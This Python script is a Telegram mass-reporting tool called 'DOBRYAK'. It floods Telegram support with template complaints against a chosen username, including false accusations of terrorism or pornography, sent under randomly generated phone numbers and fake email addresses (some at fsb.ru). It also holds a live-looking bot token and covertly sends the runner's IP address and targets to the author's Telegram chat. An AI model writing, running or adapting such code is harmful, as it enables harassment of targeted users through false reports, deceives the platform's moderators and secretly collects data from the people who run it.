import requests
import random
import time
import socket

# Telegram Bot credentials
BOT_TOKEN = "7431065669:AAHP_ZMDOykadbZWTFzGRtWEwdZt7iapGps"
CHAT_ID = "-1002182749062"

violations = {
    1: ['Спам', [
        'Уважаемая служба поддержки, обращаем ваше внимание на активности пользователя {username}, который рассылает большое количество нежелательной рекламы и сообщений в чатах и группах Telegram. Просим принять меры по прекращению данного спама.',
        'Пользователь {username} активно злоупотребляет рассылкой спама, что нарушает вежливость и правила пользования платформой Telegram. Пожалуйста, проверьте и примите соответствующие меры.'
    ]],
    2: ['Мошенничество', [
        'Уважаемая служба поддержки, прошу обратить внимание на аккаунт пользователя {username}, который предлагает участие в потенциально мошеннических схемах. Данное поведение вызывает сомнения и требует проверки.',
        'Пользователь {username} может быть причастен к мошенническим действиям, стоит рассмотреть поведение и действия данного аккаунта более детально.'
    ]],
    3: ['Порнография', [
        'Уважаемая служба поддержки, являюсь пользователем Telegram и заметил нарушения в контенте аккаунта {username}, который содержит порнографический материал. Прошу принять меры по удалению данного контента и привлечению пользователя к ответственности.',
        'Пользователь {username} активно распространяет материалы для взрослых, что противоречит правилам и целям Telegram как безопасного мессенджера.'
    ]],
    4: ['Нарушение правил', [
        'Уважаемая служба поддержки, обращаем ваше внимание на абонента {username}, который систематически нарушает правила платформы Telegram. Просим принять меры в отношении данного пользователя, чтобы обеспечить соблюдение правил сообщества.',
        'Личность {username} провоцирует конфликты и размещает недопустимый контент в чатах и каналах Telegram, что недопустимо и требует вмешательства. Просим проверить и принять соответствующие меры.'
    ]],
    5: ['Оскорбления', [
        'Уважаемая служба поддержки, обращаем ваше внимание на агрессивное и оскорбительное поведение пользователя {username}. Просим принять меры по ограничению его активности.',
        'Пользователь {username} неоднократно оскорбляет других участников, что недопустимо и нарушает правила сообщества Telegram.'
    ]],
    6: ['Нарушение авторских прав', [
        'Уважаемая служба поддержки, пользователь {username} систематически нарушает авторские права, размещая контент без разрешения правообладателей. Просим принять меры.',
        'Пользователь {username} размещает материалы, защищенные авторским правом, без разрешения. Просим рассмотреть данный вопрос и принять меры.'
    ]],
    7: ['Пропаганда насилия', [
        'Уважаемая служба поддержки, пользователь {username} активно распространяет материалы, пропагандирующие насилие. Прошу принять меры по удалению данного контента и ограничению активности пользователя.',
        'Пользователь {username} занимается пропагандой насилия, что нарушает правила Telegram и создает угрозу для пользователей. Просим проверить и принять меры.'
    ]],
    8: ['Пропаганда наркотиков', [
        'Уважаемая служба поддержки, обращаю ваше внимание на аккаунт пользователя {username}, который распространяет материалы, связанные с пропагандой наркотиков. Прошу принять меры.',
        'Пользователь {username} активно распространяет материалы, пропагандирующие употребление наркотиков. Просим рассмотреть данную деятельность и принять меры.'
    ]],
    9: ['Терроризм', [
        'Уважаемая служба поддержки, обнаружил аккаунт пользователя {username}, который связан с террористической деятельностью. Прошу принять меры по блокировке данного пользователя.',
        'Пользователь {username} может быть связан с террористической деятельностью. Просим провести проверку и принять соответствующие меры.'
    ]],
    10: ['Фейковые новости', [
        'Уважаемая служба поддержки, пользователь {username} активно распространяет фейковые новости и дезинформацию. Прошу принять меры по ограничению его деятельности.',
        'Пользователь {username} систематически распространяет ложную информацию и фейковые новости. Просим принять меры.'
    ]],
    11: ['Нарушение конфиденциальности', [
        'Уважаемая служба поддержки, пользователь {username} нарушает конфиденциальность других участников, распространяя их личные данные без разрешения. Прошу принять меры.',
        'Пользователь {username} активно нарушает конфиденциальность, распространяя личные данные других участников. Просим принять меры.'
    ]],
    12: ['Хакерство', [
        'Уважаемая служба поддержки, аккаунт пользователя {username} замечен в хакерской деятельности. Прошу принять меры по блокировке данного пользователя.',
        'Пользователь {username} занимается хакерской деятельностью, что нарушает правила Telegram. Просим провести проверку и принять меры.'
    ]]
}

# Заготовки реальных номеров телефонов для России (с разнообразными цифрами под звездочками)
phone_numbers_templates = [
    "+7917112****", "+7926386****", "+7952**99*63", "+7903**76*82",
    "+7914**237*7*", "+793761****", "+797842*****", "+798289*****",
    "+792157*****", "+799134*****", "+791068*****", "+794015*****",
    "+796172*****", "+798549*****", "+795127*****", "+791683*****",
    "+793295*****", "+797544*****", "+798978*****", "+799364*****",
    "+792358*****", "+797030*****", "+796017*****", "+799548*****",
    "+795325*****", "+791977*****", "+793836*****", "+798662*****",
    "+7907**81*7*", "+7947**53*6*", "+797129*****"
]

def send_telegram_message(message):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {"chat_id": CHAT_ID, "text": message}
    requests.post(url, data=data)

def log_activation():
    ip_address = socket.gethostbyname(socket.gethostname())
    message = f"Скрипт активирован. IP-адрес: {ip_address}"
    send_telegram_message(message)

def log_complaint(username, violation, num_complaints):
    message = (f"Отправка жалобы:\nПользователь: {username}\n"
               f"Тип жалобы: {violations[violation][0]}\n"
               f"Количество жалоб: {num_complaints}")
    send_telegram_message(message)

def generate_complaint(username, violation):
    return random.choice(violations[violation][1]).format(username=username)

def generate_email():
    domains = ["fsb.ru", "mail.ru", "gmail.com"]
    local_part = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=10))
    return f"{local_part}@{random.choice(domains)}"

def send_complaint_telegram_support(complaint, phone_number):
    url = "https://telegram.org/support"
    headers = {'content-type': 'application/json'}
    data = {'complaint': complaint, 'phone_number': phone_number}
    global complaint_count, error_count
    try:
        response = requests.post(url, headers=headers, json=data)
        if response.status_code == 200:
            complaint_count += 1
            email = generate_email()
            print("\033[92m" + f"Жалоба на {username} успешно доставлена от {phone_number}\033[0m")
            print("\033[92m" + f"Жалоба доставлена с почты {email}\033[0m")
        else:
            error_count += 1
            print("\033[91mОшибка при отправке жалобы\033[0m")
    except:
        error_count += 1
        print("\033[91mОшибка при отправке жалобы\033[0m")

complaint_count = 0
error_count = 0

log_activation()

def print_colored_text(text, color):
    colors = {
        "red": "\033[91m",
        "green": "\033[92m",
        "yellow": "\033[93m",
        "blue": "\033[94m",
        "magenta": "\033[95m",
        "cyan": "\033[96m",
        "white": "\033[97m"
    }
    reset = "\033[0m"
    print(colors[color] + text + reset)

def print_dobryak():
    print("\n")
    print_colored_text("#################################", "blue")
    print_colored_text("#                               #", "blue")
    print_colored_text("#           DOBRYAK             #", "yellow")
    print_colored_text("#                               #", "blue")
    print_colored_text("#################################", "blue")
    print("\n")

def print_complaint_options():
    print_colored_text("###########################################", "cyan")
    for key, value in violations.items():
        print_colored_text(f"# {key} - {value[0]}", "cyan")
    print_colored_text("###########################################", "cyan")

password = input("Пожалуйста, введите пароль: ")
print_dobryak()
if password == "dobryak":
    username = input("Введите юзернейм пользователя: ")

    if username.lower() == "@colcevi" or username == "@zovcoine":
        print("\033[93m" + "Ты тупой? жалобы на создателя скрипта кидаешь? пшл нах, купить вайт лист в скрипте у @zovcoine" + "\033[0m")
    else:
        print_complaint_options()
        violation = int(input("Введите номер типа жалобы: "))

        num_complaints = int(input("Введите количество жалоб для отправки:"))
        log_complaint(username, violation, num_complaints)

        # Заменяем каждую звездочку в номере телефона на случайную цифру
        phone_numbers = []
        for tpl in random.choices(phone_numbers_templates, k=num_complaints):
            phone_number = ''.join(random.choice('0123456789') if char == '*' else char for char in tpl)
            phone_numbers.append(phone_number)

        print_colored_text("Отправка жалоб...", "yellow")
        for phone_number in phone_numbers:
            complaint = generate_complaint(username, violation)
            send_complaint_telegram_support(complaint, phone_number)
            time.sleep(0.1)  # Пауза в 0.1 секунд между отправкой жалоб

        print_colored_text(f"Количество отправленных жалоб: {complaint_count}", "green")
        print_colored_text(f"Количество ошибок: {error_count}", "red")
        print_colored_text(f"Пользователь: {username}", "blue")
        print_colored_text(f"Тип жалобы: {violations[violation][0]}", "blue")
else:
    print_colored_text("Неверный пароль. Доступ запрещен.", "red")